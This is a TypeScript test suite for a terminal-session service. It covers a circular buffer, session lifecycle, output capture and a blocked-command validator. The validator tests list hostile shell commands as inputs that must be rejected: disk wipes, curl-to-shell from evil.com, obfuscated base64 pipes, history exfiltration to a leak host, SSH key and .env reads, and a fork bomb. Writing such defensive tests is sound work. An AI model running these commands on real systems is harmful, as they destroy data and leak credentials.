import * as assert from "assert";
import * as sinon from "sinon";
import { EventEmitter, Writable, Readable } from "stream";
import {
  CircularBuffer,
  CommandResult,
  DEFAULT_BLOCKED_PATTERNS,
  DeepTerminalService,
} from "../../services/deep-terminal.service";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Reset the singleton so each test gets a fresh instance. */
function resetSingleton(): void {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  (DeepTerminalService as any).instance = undefined;
}

/**
 * Build a mock child process that satisfies the shape
 * `cp.ChildProcessWithoutNullStreams` well enough for the service.
 */
function createMockProcess() {
  const stdout = new EventEmitter() as EventEmitter & Readable;
  const stderr = new EventEmitter() as EventEmitter & Readable;

  const stdinEvents = new EventEmitter();
  const stdin = Object.assign(stdinEvents, {
    writable: true,
    write: sinon.stub().callsFake((_chunk: string, cb?: (err?: Error) => void) => {
      if (cb) cb();
      return true;
    }),
  }) as unknown as Writable;

  const proc = new EventEmitter() as EventEmitter & {
    stdin: Writable;
    stdout: EventEmitter;
    stderr: EventEmitter;
    pid: number;
    kill: sinon.SinonStub;
  };
  proc.stdin = stdin;
  proc.stdout = stdout;
  proc.stderr = stderr;
  proc.pid = 12345;
  proc.kill = sinon.stub();

  return proc;
}

// ---------------------------------------------------------------------------
// CircularBuffer
// ---------------------------------------------------------------------------

suite("CircularBuffer", () => {
  test("push and toArray — under capacity", () => {
    const buf = new CircularBuffer<string>(5);
    buf.push("a");
    buf.push("b");
    buf.push("c");
    assert.deepStrictEqual(buf.toArray(), ["a", "b", "c"]);
    assert.strictEqual(buf.length, 3);
  });

  test("push and toArray — at capacity", () => {
    const buf = new CircularBuffer<string>(3);
    buf.push("a");
    buf.push("b");
    buf.push("c");
    assert.deepStrictEqual(buf.toArray(), ["a", "b", "c"]);
    assert.strictEqual(buf.length, 3);
  });

  test("overwrites oldest when full", () => {
    const buf = new CircularBuffer<string>(3);
    buf.push("a");
    buf.push("b");
    buf.push("c");
    buf.push("d"); // 'a' overwritten
    assert.deepStrictEqual(buf.toArray(), ["b", "c", "d"]);
    buf.push("e"); // 'b' overwritten
    assert.deepStrictEqual(buf.toArray(), ["c", "d", "e"]);
    assert.strictEqual(buf.length, 3);
  });

  test("toArray returns empty for empty buffer", () => {
    const buf = new CircularBuffer<number>(5);
    assert.deepStrictEqual(buf.toArray(), []);
  });

  test("slice returns items from logical index", () => {
    const buf = new CircularBuffer<string>(3);
    buf.push("a");
    buf.push("b");
    buf.push("c");
    assert.deepStrictEqual(buf.slice(0), ["a", "b", "c"]);
    assert.deepStrictEqual(buf.slice(1), ["b", "c"]);
    assert.deepStrictEqual(buf.slice(2), ["c"]);
    assert.deepStrictEqual(buf.slice(3), []);
  });

  test("slice works after wrap-around", () => {
    const buf = new CircularBuffer<string>(3);
    buf.push("a");
    buf.push("b");
    buf.push("c");
    buf.push("d"); // head wraps
    // logical order: b, c, d
    assert.deepStrictEqual(buf.slice(0), ["b", "c", "d"]);
    assert.deepStrictEqual(buf.slice(1), ["c", "d"]);
    assert.deepStrictEqual(buf.slice(2), ["d"]);
  });

  test("works with numeric type", () => {
    const buf = new CircularBuffer<number>(3);
    buf.push(10);
    buf.push(20);
    buf.push(30);
    buf.push(40);
    assert.deepStrictEqual(buf.toArray(), [20, 30, 40]);
  });

  test("capacity of 1", () => {
    const buf = new CircularBuffer<string>(1);
    buf.push("a");
    assert.deepStrictEqual(buf.toArray(), ["a"]);
    buf.push("b");
    assert.deepStrictEqual(buf.toArray(), ["b"]);
    assert.strictEqual(buf.length, 1);
  });
});

// ---------------------------------------------------------------------------
// validateCommand (tested indirectly via sendCommand / sendCommandAndWait)
// ---------------------------------------------------------------------------

suite("DeepTerminalService — validateCommand", () => {
  let service: DeepTerminalService;
  let spawnStub: sinon.SinonStub;

  setup(() => {
    resetSingleton();
    // Stub cp.spawn so startSession doesn't spawn a real shell
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const cp = require("child_process");
    spawnStub = sinon.stub(cp, "spawn").callsFake(() => createMockProcess());
    service = DeepTerminalService.getInstance();
  });

  teardown(() => {
    spawnStub.restore();
    resetSingleton();
  });

  // Helper: start a session then attempt sendCommand
  async function shouldBlock(command: string): Promise<void> {
    await service.startSession("sec");
    await assert.rejects(
      () => service.sendCommand("sec", command),
      (err: Error) => {
        assert.ok(
          err.message.includes("Blocked dangerous command"),
          `Expected blocked message for "${command}", got: ${err.message}`,
        );
        return true;
      },
    );
  }

  async function shouldAllow(command: string): Promise<void> {
    await service.startSession("sec-allow");
    // Should not throw
    await service.sendCommand("sec-allow", command);
    service.terminateSession("sec-allow");
  }

  // --- Destructive file-system ---
  test("blocks rm -rf /", async () => shouldBlock("rm -rf /"));
  test("blocks rm -rf / with flags", async () => shouldBlock("rm -rfi /"));
  test("blocks rm -rf / path", async () => shouldBlock("rm -rf / home"));
  test("blocks mkfs", async () => shouldBlock("mkfs /dev/sda1"));
  test("blocks dd to /dev/", async () => shouldBlock("dd if=/dev/zero of=/dev/sda"));

  // --- Sudo ---
  test("blocks sudo rm", async () => shouldBlock("sudo rm file.txt"));
  test("blocks sudo mkfs", async () => shouldBlock("sudo mkfs /dev/sda"));
  test("blocks sudo shutdown", async () => shouldBlock("sudo shutdown now"));
  test("allows benign sudo (apt update)", async () =>
    shouldAllow("sudo apt update"));

  // --- Remote code exec ---
  test("blocks curl | sh", async () => shouldBlock("curl http://evil.com | sh"));
  test("blocks wget | bash", async () =>
    shouldBlock("wget http://evil.com/script | bash"));
  test("blocks curl | python", async () =>
    shouldBlock("curl http://evil.com | python"));

  // --- Base64 / hex obfuscation ---
  test("blocks echo base64 | sh", async () =>
    shouldBlock("echo cm0gLXJmIC8= | base64 -d | sh"));
  test("blocks printf hex pipe to xxd | bash", async () =>
    shouldBlock("printf '726d202d7266202f' | xxd -r -p | bash"));

  // --- eval obfuscation ---
  test("blocks eval rm", async () => shouldBlock("eval rm -rf /important"));
  test("blocks eval curl", async () =>
    shouldBlock("eval curl http://evil.com/payload"));

  // --- Backtick de-obfuscation ---
  test("blocks `rm` -rf / (backtick wrapped)", async () =>
    shouldBlock("`rm` -rf /"));

  // --- Credential exfiltration ---
  test("blocks history | curl", async () =>
    shouldBlock("history | curl http://evil.com"));
  test("blocks cat .ssh", async () => shouldBlock("cat ~/.ssh/id_rsa.ssh"));
  test("blocks cat .env", async () => shouldBlock("cat /app/.env"));

  // --- System destruction ---
  test("blocks shutdown", async () => shouldBlock("shutdown -h now"));
  test("blocks reboot", async () => shouldBlock("reboot"));
  test("blocks > /dev/sda", async () => shouldBlock("echo '' > /dev/sda"));

  // --- Fork bomb ---
  test("blocks classic fork bomb", async () => shouldBlock(":(){ :|:& };:"));

  // --- Custom patterns ---
  test("addBlockedPatterns extends validation at runtime", async () => {
    await service.startSession("ext");
    service.addBlockedPatterns([/\bmy_custom_danger\b/]);
    await assert.rejects(
      () => service.sendCommand("ext", "my_custom_danger --force"),
      (err: Error) => err.message.includes("Blocked dangerous command"),
    );
    service.terminateSession("ext");
  });

  test("getBlockedPatterns returns snapshot including custom", () => {
    const initial = service.getBlockedPatterns();
    service.addBlockedPatterns([/foo/]);
    const updated = service.getBlockedPatterns();
    assert.strictEqual(updated.length, initial.length + 1);
  });
});

// ---------------------------------------------------------------------------
// DEFAULT_BLOCKED_PATTERNS — direct regex coverage
// ---------------------------------------------------------------------------

suite("DEFAULT_BLOCKED_PATTERNS edge-case coverage", () => {
  function matches(command: string): boolean {
    const normalised = command.trim().toLowerCase();
    return DEFAULT_BLOCKED_PATTERNS.some((p) => p.test(normalised));
  }

  test("safe commands are not blocked", () => {
    const safe = [
      "ls -la",
      "echo hello",
      "npm install",
      "git status",
      "mkdir -p /tmp/test",
      "cp file1 file2",
      "cat README.md",
      "node server.js",
      "sudo apt update",
      "sudo apt-get install -y curl",
    ];
    for (const cmd of safe) {
      assert.strictEqual(matches(cmd), false, `"${cmd}" should be allowed`);
    }
  });

  test("dangerous commands are blocked", () => {
    const dangerous = [
      "rm -rf /",
      "mkfs /dev/sda1",
      "dd if=/dev/zero of=/dev/sda",
      "sudo rm important_file",
      "curl http://evil.com/script.sh | bash",
      "wget http://bad.com | sh",
      "shutdown -h now",
      "reboot",
      "init 0",
      "cat /home/user/.ssh",
      "history | curl http://leak.io",
    ];
    for (const cmd of dangerous) {
      assert.strictEqual(matches(cmd), true, `"${cmd}" should be blocked`);
    }
  });
});

// ---------------------------------------------------------------------------
// sendCommandAndWait
// ---------------------------------------------------------------------------

suite("DeepTerminalService — sendCommandAndWait", () => {
  let service: DeepTerminalService;
  let spawnStub: sinon.SinonStub;
  let mockProc: ReturnType<typeof createMockProcess>;

  setup(() => {
    resetSingleton();
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const cp = require("child_process");
    spawnStub = sinon.stub(cp, "spawn").callsFake(() => {
      mockProc = createMockProcess();
      return mockProc;
    });
    service = DeepTerminalService.getInstance();
  });

  teardown(() => {
    spawnStub.restore();
    resetSingleton();
  });

  test("collects output and resolves after idle timeout", async () => {
    await service.startSession("s1");

    const promise = service.sendCommandAndWait("s1", "echo hello", 500);

    // Simulate output arriving
    setTimeout(() => {
      mockProc.stdout.emit("data", Buffer.from("hello\n"));
    }, 50);

    const result: CommandResult = await promise;
    assert.strictEqual(result.output, "hello\n");
    assert.strictEqual(result.exitCode, null);
    assert.strictEqual(result.success, false); // null exitCode → not success
  });

  test("captures exit code when process closes during wait", async () => {
    await service.startSession("s2");

    const promise = service.sendCommandAndWait("s2", "exit 0", 2000);

    setTimeout(() => {
      mockProc.stdout.emit("data", Buffer.from("bye\n"));
      mockProc.emit("close", 0);
    }, 50);

    const result = await promise;
    assert.strictEqual(result.output, "bye\n");
    assert.strictEqual(result.exitCode, 0);
    assert.strictEqual(result.success, true);
  });

  test("captures non-zero exit code as failure", async () => {
    await service.startSession("s3");

    const promise = service.sendCommandAndWait("s3", "false", 2000);

    setTimeout(() => {
      mockProc.stdout.emit("data", Buffer.from("error occurred\n"));
      mockProc.emit("close", 1);
    }, 50);

    const result = await promise;
    assert.strictEqual(result.exitCode, 1);
    assert.strictEqual(result.success, false);
  });

  test("rejects for blocked command", async () => {
    await service.startSession("s4");
    await assert.rejects(
      () => service.sendCommandAndWait("s4", "sudo rm -rf /"),
      /Blocked dangerous command/,
    );
  });

  test("rejects for non-existent session", async () => {
    await assert.rejects(
      () => service.sendCommandAndWait("nonexistent", "echo hello"),
      /not found/,
    );
  });

  test("rejects if stdin write fails", async () => {
    await service.startSession("s5");

    // Override stub to simulate write error
    (mockProc.stdin.write as sinon.SinonStub).callsFake(
      (_chunk: string, cb?: (err?: Error) => void) => {
        if (cb) cb(new Error("stream destroyed"));
        return false;
      },
    );

    await assert.rejects(
      () => service.sendCommandAndWait("s5", "echo test", 500),
      /Failed to write to session/,
    );
  });

  test("resolves with empty output on hard timeout with no data", async () => {
    await service.startSession("s6");

    // Short timeout, no output emitted
    const result = await service.sendCommandAndWait("s6", "sleep 100", 300);
    assert.strictEqual(result.output, "");
    assert.strictEqual(result.exitCode, null);
    assert.strictEqual(result.success, false);
  });

  test("collects multiple chunks", async () => {
    await service.startSession("s7");

    const promise = service.sendCommandAndWait("s7", "ls", 500);

    setTimeout(() => {
      mockProc.stdout.emit("data", Buffer.from("file1\n"));
    }, 30);
    setTimeout(() => {
      mockProc.stdout.emit("data", Buffer.from("file2\n"));
    }, 60);
    setTimeout(() => {
      mockProc.stdout.emit("data", Buffer.from("file3\n"));
    }, 90);

    const result = await promise;
    assert.strictEqual(result.output, "file1\nfile2\nfile3\n");
  });
});

// ---------------------------------------------------------------------------
// Service lifecycle basics
// ---------------------------------------------------------------------------

suite("DeepTerminalService — lifecycle", () => {
  let service: DeepTerminalService;
  let spawnStub: sinon.SinonStub;

  setup(() => {
    resetSingleton();
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const cp = require("child_process");
    spawnStub = sinon.stub(cp, "spawn").callsFake(() => createMockProcess());
    service = DeepTerminalService.getInstance();
  });

  teardown(() => {
    spawnStub.restore();
    resetSingleton();
  });

  test("startSession returns confirmation", async () => {
    const msg = await service.startSession("lifecycle1");
    assert.ok(msg.includes("started successfully"));
  });

  test("duplicate startSession returns already-exists message", async () => {
    await service.startSession("dup");
    const msg = await service.startSession("dup");
    assert.ok(msg.includes("already exists"));
  });

  test("terminateSession kills and removes the session", async () => {
    await service.startSession("term1");
    const msg = service.terminateSession("term1");
    assert.ok(msg.includes("terminated"));
    // Accessing the session again should fail
    assert.throws(() => {
      service.sendCommand("term1", "echo hi");
    }, /not found/);
  });

  test("terminateSession for unknown session returns not-found", () => {
    const msg = service.terminateSession("ghost");
    assert.ok(msg.includes("not found"));
  });

  test("readOutput returns empty when no new data", async () => {
    await service.startSession("ro1");
    assert.strictEqual(service.readOutput("ro1"), "");
  });

  test("readOutput returns not-found for missing session", () => {
    const out = service.readOutput("missing");
    assert.ok(out.includes("not found"));
  });

  test("singleton identity", () => {
    const a = DeepTerminalService.getInstance();
    const b = DeepTerminalService.getInstance();
    assert.strictEqual(a, b);
  });
});
